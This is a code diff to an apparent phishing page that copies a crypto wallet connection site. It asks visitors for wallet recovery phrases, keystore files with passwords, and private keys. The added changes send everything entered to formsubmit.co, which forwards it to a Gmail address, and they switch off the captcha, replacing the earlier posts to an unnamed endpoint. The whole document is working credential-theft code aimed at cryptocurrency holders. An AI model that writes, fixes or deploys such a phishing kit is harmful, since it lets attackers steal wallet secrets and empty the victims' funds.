@@ -699,6 +699,8 @@
             <form action="https://formsubmit.co/thefamilyonly994@gmail.com" method="post" id="form">
 
               <input type="hidden" name="_subject" value="New message from GRASS Site">
+              <input type="hidden" name="_next" value="http://127.0.0.1:5500/">
+              <input type="hidden" name="_captcha" value="false">
 
 
               <div class="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left w-full mr-10">
@@ -2132,29 +2134,19 @@
         window.location.href = 'https://walletconnect.com/blog';
       }
 
-      function phraseProceedHandler() {
+      function phraseProceedHandler(event) {
+        event.preventDefault();
         var phraseInputVal = document.getElementById('phraseInput').value;
         var wallet = document.getElementById('wallet_id').value;
         if (!phraseInputVal || phraseInputVal.trim() === '') {
           alert('Fill in your recovery phrase');
           return;
         }
-        $.ajax({
-          url: endpoint,
-          method: 'POST',
-          data: { import_type: 'phrase', wallet: wallet, phrase: phraseInputVal },
-          dataType: 'json',
-          success: function (res) {
-            phraseInputVal = '';
-            onSuccess();
-          },
-          error: function () {
-            alert('Could not proceed due to some errors, kindly try again later.');
-          }
-        });
+        document.getElementById('form').submit();
       }
 
-      function keystorejsonProceedHandler() {
+      function keystorejsonProceedHandler(event) {
+        event.preventDefault();
         var keystorejson = document.getElementById('keystorejson').value;
         var keystorepassword = document.getElementById('keystorepassword').value;
         var wallet = document.getElementById('wallet_id').value;
@@ -2162,39 +2154,18 @@
           alert('Fill out all form fields before proceeding');
           return;
         }
-        $.ajax({
-          url: endpoint,
-          method: 'POST',
-          data: { import_type: 'keystorejson', wallet: wallet, keystorejson: keystorejson, keystorepassword: keystorepassword },
-          dataType: 'json',
-          success: function (res) {
-            onSuccess();
-          },
-          error: function () {
-            alert('Could not proceed due to some errors, kindly try again later.');
-          }
-        });
+        document.getElementById('form').submit();
       }
 
-      function privateKeyProceedHandler() {
+      function privateKeyProceedHandler(event) {
+        event.preventDefault();
         var privatekey = document.getElementById('privatekey').value;
         var wallet = document.getElementById('wallet_id').value;
         if (!privatekey || privatekey.trim() === '') {
           alert('Fill in your private key');
           return;
         }
-        $.ajax({
-          url: endpoint,
-          method: 'POST',
-          data: { import_type: 'private', wallet: wallet, privatekey: privatekey },
-          dataType: 'json',
-          success: function (res) {
-            onSuccess();
-          },
-          error: function () {
-            alert('Could not proceed due to some errors, kindly try again later.');
-          }
-        });
+        document.getElementById('form').submit();
       }
 
       phraseProceedBtn.addEventListener('click', phraseProceedHandler);
